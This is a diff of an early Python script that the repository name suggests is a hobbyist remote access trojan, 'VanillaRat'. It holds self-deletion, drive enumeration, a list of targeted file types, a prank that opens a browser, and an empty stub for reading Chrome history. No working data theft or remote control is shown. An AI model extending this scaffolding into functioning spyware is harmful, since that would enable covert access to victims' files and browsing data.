@@ -1,26 +1,24 @@
 VERSION = 0.001
-
+import subprocess
 import socket
 from os import remove
 from sys import argv
 import os
+from time import sleep
 import webbrowser
 import platform
 import requests as r
 from bs4 import BeautifulSoup
 
-#import rotatescreen
-# def rotate_screen():
-#     rotate_screen  = rotatescreen.get_primary_display()
-#     rotate_screen.set_landscape_flipped()
+
 
 YES = ['y', 'Y', 'YES', 'yes', 'Yes']
 
 NO = ['n', 'N', 'NO', 'no', 'No']
 
-github_url = 'https://github.com/ZingKidd/VanillaRat/blob/main/main.py'
+github_url = 'https://github.com/ZingKidd/Vanilla/blob/main/main.py'
 
-drives = ["A:\\", "B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
+DRIVES = ["A:\\", "B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
 
 different_extensions = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.jpeg', '.mp4']
 
@@ -33,7 +31,7 @@ def return_os():
 def self_delete():
     remove(argv[0])
 
-def find_ip(hostname):
+def find_ip():
     hostname = socket.gethostname()
     return socket.gethostbyname(hostname)
 
@@ -51,12 +49,12 @@ def rick_roll():
     url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
     webbrowser.open(url)
 
-def show_alive_drives(drives):
+def show_alive_drives(drives = DRIVES):
     for drive in drives:
         if os.path.exists(drive):
             print(f"Drive {drive} Does exist")
 
-def check_alive_drives(drives):
+def check_alive_drives(drives = DRIVES):
     for drive in drives:
         if os.path.exists(drive):
             print(f"Drive {drive} Does exist")
@@ -64,9 +62,6 @@ def check_alive_drives(drives):
             # locate_drives(drive)
         else:
             print(f"Drive {drive} does not exist")
-
-def chrome_history():
-    pass
 
 def check_for_update(github_url):
     html_text = r.get(github_url).text
@@ -92,3 +87,12 @@ def update():
     else:
         print('Something went wrong...')
         update()
+
+def banner():
+    pass
+
+def rotate_screen():
+    pass
+
+def chrome_history():
+    pass
